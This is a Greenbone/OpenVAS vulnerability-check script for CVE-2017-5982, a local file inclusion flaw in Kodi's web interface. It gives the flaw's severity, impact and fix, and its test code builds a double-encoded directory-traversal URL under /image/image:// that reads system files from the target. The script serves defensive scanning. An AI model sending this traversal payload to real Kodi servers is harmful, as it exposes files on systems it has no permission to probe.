CPE = "cpe:/a:kodi:kodi";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106586" );
	script_version( "2021-09-15T10:01:53+0000" );
	script_tag( name: "last_modification", value: "2021-09-15 10:01:53 +0000 (Wed, 15 Sep 2021)" );
	script_tag( name: "creation_date", value: "2017-02-13 10:37:26 +0700 (Mon, 13 Feb 2017)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-03-03 02:59:00 +0000 (Fri, 03 Mar 2017)" );
	script_cve_id( "CVE-2017-5982" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Kodi Local File Inclusion Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_kodi_web_server_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "Kodi/WebServer/installed" );
	script_tag( name: "summary", value: "Kodi is prone to an arbitrary file disclosure vulnerability." );
	script_tag( name: "vuldetect", value: "Tries to read a system file." );
	script_tag( name: "insight", value: "The web interface loads a thumbnail of an image, video or add-on when
selecting a category in the left menu. Insufficient validation of user input is performed on this URL resulting
in a local file inclusion vulnerability." );
	script_tag( name: "impact", value: "A unauthenticated attacker may read arbitrary files from the file system." );
	script_tag( name: "solution", value: "Update to Kodi version 17.2 or later. For details please see the references." );
	script_xref( name: "URL", value: "https://kodi.tv/article/kodi-v172-minor-bug-fix-and-security-release" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/41312/" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/image/image%3A%2F%2F%2e%2e%252f" + str_replace( string: files[file], find: "/", replace: "%252f" );
	if(http_vuln_check( port: port, url: url, pattern: file, check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

